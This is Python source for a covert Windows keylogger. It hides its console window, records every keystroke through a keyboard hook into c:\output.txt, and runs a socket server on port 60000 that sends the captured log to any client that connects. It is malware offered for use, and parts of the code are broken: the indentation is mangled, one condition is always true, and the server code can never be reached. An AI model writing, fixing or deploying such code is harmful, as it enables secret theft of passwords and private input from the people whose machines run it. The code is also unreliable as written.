import win32api
import win32console
import win32gui
import pythoncom,pyHook
import socket

 
win=win32console.GetConsoleWindow()
win32gui.ShowWindow(win,0)
 
def OnKeyboardEvent(event):
if event.Ascii==5:
_exit(1)
if event.Ascii !=0 or 8:
#open output.txt to read current keystrokes
thefile=open('c:\output.txt','r+')
buffer=thefile.read()
thefile.close()
#open output.txt to write current + new keystrokes
thefile=open('c:\output.txt','w')
keylogs=chr(event.Ascii)
if event.Ascii==13:
keylogs='/n'
buffer+=keylogs
thefile.write(buffer)
thefile.close()
# create a hook manager object
hm=pyHook.HookManager()
hm.KeyDown=OnKeyboardEvent
# set the hook
hm.HookKeyboard()
# wait forever
pythoncom.PumpMessages()

#=====================================================

port = 60000                    # Reserve a port for your service.
s = socket.socket()             # Create a socket object
host = socket.gethostname()     # Get local machine name
s.bind((host, port))            # Bind to the port
s.listen(5)                     # Now wait for client connection.

print 'Server listening....'

while True:
    conn, addr = s.accept()     # Establish connection with client.
    print 'Got connection from', addr
    data = conn.recv(1024)
    print('Server received', repr(data))

    filename='c:\output.txt'
    f = open(filename,'rb')
    l = f.read(1024)
    while (l):
       conn.send(l)
       print('Sent ',repr(l))
       l = f.read(1024)
    f.close()

    print('Done sending')
    conn.send('Thank you for connecting')
    conn.close()
